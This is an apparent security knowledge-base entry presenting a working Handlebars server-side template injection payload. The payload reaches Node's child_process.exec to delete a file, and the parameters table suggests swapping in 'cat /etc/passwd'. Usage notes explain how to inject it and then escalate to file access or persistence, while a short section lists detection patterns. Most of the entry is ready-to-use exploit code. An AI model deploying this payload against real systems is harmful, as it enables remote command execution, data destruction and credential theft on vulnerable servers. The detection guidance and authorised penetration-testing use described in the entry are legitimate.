---
type: code
language: handlebars
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - ssti
  - handlebars
  - rce
  - payload
  - exploit
validated: true
---

# Handlebars-SSTI-RCE-Payload

## Code

```handlebars
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Description

This Handlebars template payload exploits Server-Side Template Injection by polluting the prototype chain to access the constructor of string.sub, then injecting and executing a Node.js command via require('child_process').exec. It is designed for RCE in vulnerable Handlebars-rendered applications, here demonstrated by deleting a specific file.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `rm /home/carlos/morale.txt` | The shell command to execute via exec() | `whoami` or `cat /etc/passwd` |

## Usage

Inject this payload into a user-controlled template parameter (e.g., GET ?message=) after URL-encoding. Used in red team engagements or pentests to achieve RCE on Node.js backends using Handlebars. Start with benign commands to test, then escalate to file access or persistence.

## Detection

- Monitor server logs for template rendering errors or unusual #with/#each helper usage.
- WAF rules for SSTI patterns: {{this.pop}}, string.sub.constructor, require('child_process').
- File integrity monitoring (e.g., auditd) for unexpected deletions or executions.
- Network anomalies if command outputs data exfiltration.

## Related

- [[procedures/Exploit-Handlebars-SSTI-for-Remote-Command-Execution]]
- [[tools/Burp-Suite]]
